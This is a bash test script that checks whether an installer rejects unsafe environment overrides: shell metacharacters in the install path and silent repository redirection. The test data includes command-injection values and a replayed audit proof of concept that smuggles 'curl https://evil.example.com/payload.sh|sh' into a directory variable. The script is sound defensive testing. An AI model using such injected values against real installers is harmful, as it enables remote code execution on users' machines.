#!/usr/bin/env bash
# shellcheck shell=bash
#
# Installer env-injection smoke tests — Phase 11.B (L-01 / L-02).
#
# Verifies that install.sh refuses to run under dangerous environment
# overrides that previously would have let an attacker:
#
#   L-01: silently redirect downloads to an evil fork via MANDU_REPO
#   L-02: inject shell metacharacters into .bashrc via MANDU_INSTALL_DIR
#
# All tests use `--dry-run` so no network or filesystem mutation occurs;
# the checks we're validating happen BEFORE the download phase and will
# short-circuit with exit code 5 whenever an unsafe input is supplied.
#
# Each dangerous value is passed via an explicit `export` in a sub-shell
# rather than `env NAME=... command` — the env(1) syntax cannot safely
# carry values that contain spaces or shell metacharacters because it
# parses its own arglist.
#
# Run locally:
#   bash .github/workflows/__tests__/installer-env-injection.sh
#
# Expected: "failed: 0" in the summary.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT="$(cd "${SCRIPT_DIR}/../../.." && pwd)"

INSTALL_SH="${ROOT}/install.sh"

PASS=0
FAIL=0

ok()   { PASS=$((PASS + 1)); printf '  ok   %s\n' "$*"; }
fail() { FAIL=$((FAIL + 1)); printf '  FAIL %s\n' "$*" >&2; }

section() { printf '\n== %s ==\n' "$*"; }

# On Windows runners (Git Bash / MSYS) install.sh refuses to run without
# the escape hatch. All tests below need that flag so the script reaches
# the env-validation stage rather than bailing on platform detection.
FORCE_UNIX_ON_WIN=0
case "$(uname -s)" in
  MINGW*|MSYS*|CYGWIN*)
    FORCE_UNIX_ON_WIN=1
    ;;
esac

# ---------------------------------------------------------------------------
# run_dry — invoke install.sh --dry-run under a set of env overrides.
#
# Usage: run_dry <VAR1=val1> <VAR2=val2> ... -- <expected-rc> <expected-substr>
#
# The `--` separator delimits the env-override list from the expectation
# pair. This lets us pass values containing spaces, quotes, `;`, `$()`,
# backticks, and other shell metacharacters safely via the `export`
# builtin (unlike `env VAR=value` which splits on whitespace).
#
# We run each test in a fresh bash subshell so exported vars don't leak
# to subsequent invocations. `errexit` is dropped in the subshell so
# install.sh's non-zero exits are captured rather than terminating us.
# ---------------------------------------------------------------------------
run_dry_internal() {
  local expect_rc="$1"; shift
  local expect_substr="$1"; shift
  local label="$1"; shift
  # Remaining args are VAR=value pairs. We forward them literally through
  # a bash subshell, letting its export builtin do the work.

  local script=""
  if [ "${FORCE_UNIX_ON_WIN}" = "1" ]; then
    script+='export MANDU_FORCE_UNIX=1'$'\n'
  fi
  local pair
  for pair in "$@"; do
    # Strip the NAME= prefix to get the value, then re-quote safely.
    local name="${pair%%=*}"
    local value="${pair#*=}"
    # Use printf %q to produce a shell-safe single-token representation
    # of the value. bash's printf %q preserves all special chars via
    # backslash escapes.
    script+="export ${name}=$(printf '%q' "${value}")"$'\n'
  done
  script+="sh \"${INSTALL_SH}\" --dry-run </dev/null 2>&1"

  set +e
  local out
  out=$(bash -c "${script}")
  local rc=$?
  set -e

  if [ "${rc}" != "${expect_rc}" ]; then
    fail "${label}: expected exit ${expect_rc}, got ${rc}"
    printf '    script:\n%s\n' "${script}" | sed 's/^/      /'
    printf '    output:\n%s\n' "${out}" | sed 's/^/      /'
    return
  fi
  if [ -n "${expect_substr}" ] && ! printf '%s' "${out}" | grep -Fq "${expect_substr}"; then
    fail "${label}: missing expected substring '${expect_substr}'"
    printf '    output:\n%s\n' "${out}" | sed 's/^/      /'
    return
  fi
  ok "${label}"
}

# Convenience wrappers: shape the call like
#   expect_reject "label" 5 "needle" VAR=value [VAR=value...]
expect_reject() {
  local label="$1"; local rc="$2"; local needle="$3"; shift 3
  run_dry_internal "${rc}" "${needle}" "${label}" "$@"
}

expect_success() {
  local label="$1"; shift
  run_dry_internal "0" "[dry-run]" "${label}" "$@"
}

# ---------------------------------------------------------------------------
# 1. Baseline — no overrides, should reach dry-run.
# ---------------------------------------------------------------------------
section "baseline"

expect_success "default run with no overrides reaches dry-run"

# ---------------------------------------------------------------------------
# 2. L-02 — MANDU_INSTALL_DIR char filter
# ---------------------------------------------------------------------------
section "L-02 install dir char filter"

expect_success \
  "path with letters, digits, slashes, dots, underscores, dashes accepted" \
  "MANDU_INSTALL_DIR=/home/user/.mandu/bin-v2.0"

expect_reject \
  "semicolon rejected" \
  5 "MANDU_INSTALL_DIR contains unsafe characters" \
  "MANDU_INSTALL_DIR=/tmp/mandu;rm"

expect_reject \
  "double-quote rejected" \
  5 "unsafe characters" \
  'MANDU_INSTALL_DIR=/tmp/mandu";curl'

expect_reject \
  "dollar-parenthesis (command substitution glyph) rejected" \
  5 "unsafe characters" \
  'MANDU_INSTALL_DIR=/tmp/mandu$(whoami)'

expect_reject \
  "backtick rejected" \
  5 "unsafe characters" \
  'MANDU_INSTALL_DIR=/tmp/mandu`id`'

expect_reject \
  "space rejected (path-spaces are routinely mishandled downstream)" \
  5 "unsafe characters" \
  "MANDU_INSTALL_DIR=/tmp/man du"

# Empty MANDU_INSTALL_DIR falls back to $HOME/.mandu/bin (POSIX `:-`
# expansion). This is the desired behavior: users who `unset` or clear
# the env var get the default, not an error. Documented here so a
# future change that makes empty errorful is an intentional one.
expect_success \
  "empty MANDU_INSTALL_DIR falls back to default (not an error)" \
  "MANDU_INSTALL_DIR="

expect_reject \
  "pure dot rejected" \
  5 "must be a real directory path" \
  "MANDU_INSTALL_DIR=."

expect_reject \
  "parent-dir literal rejected" \
  5 "must be a real directory path" \
  "MANDU_INSTALL_DIR=.."

expect_reject \
  "root-only rejected" \
  5 "must be a real directory path" \
  "MANDU_INSTALL_DIR=/"

# ---------------------------------------------------------------------------
# 3. L-01 — MANDU_REPO allowlist + confirmation
# ---------------------------------------------------------------------------
section "L-01 repo override guard"

expect_reject \
  "non owner/repo shape rejected" \
  5 "must be in owner/repo format" \
  "MANDU_REPO=evilonly"

expect_reject \
  "unsafe chars in repo rejected" \
  5 "unsafe characters" \
  "MANDU_REPO=evil/bar;foo"

expect_reject \
  "command substitution in repo rejected" \
  5 "unsafe characters" \
  'MANDU_REPO=evil/$(whoami)'

expect_reject \
  "non-default repo without confirmation rejected (non-interactive)" \
  5 "requires MANDU_REPO_CONFIRM=yes" \
  "MANDU_REPO=evil-fork/mandu"

expect_success \
  "non-default repo with MANDU_REPO_CONFIRM=yes proceeds to dry-run" \
  "MANDU_REPO=evil-fork/mandu" "MANDU_REPO_CONFIRM=yes"

# ---------------------------------------------------------------------------
# 4. Combined attacks — the classic payload from the audit report.
# ---------------------------------------------------------------------------
section "audit PoC replays"

# The exact MANDU_INSTALL_DIR payload from docs/security/phase-9-audit.md §L-02.
expect_reject \
  "phase-9-audit L-02 PoC rejected" \
  5 "unsafe characters" \
  'MANDU_INSTALL_DIR=/tmp/mandu";curl https://evil.example.com/payload.sh|sh;#'

# The silent MANDU_REPO redirect from §L-01 must now be loud.
expect_reject \
  "phase-9-audit L-01 PoC (silent redirect) rejected" \
  5 "requires MANDU_REPO_CONFIRM=yes" \
  "MANDU_REPO=evil-fork/mandu"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
printf '\n== summary ==\n'
printf '  passed: %d\n' "${PASS}"
printf '  failed: %d\n' "${FAIL}"

if [ "${FAIL}" -gt 0 ]; then
  exit 1
fi
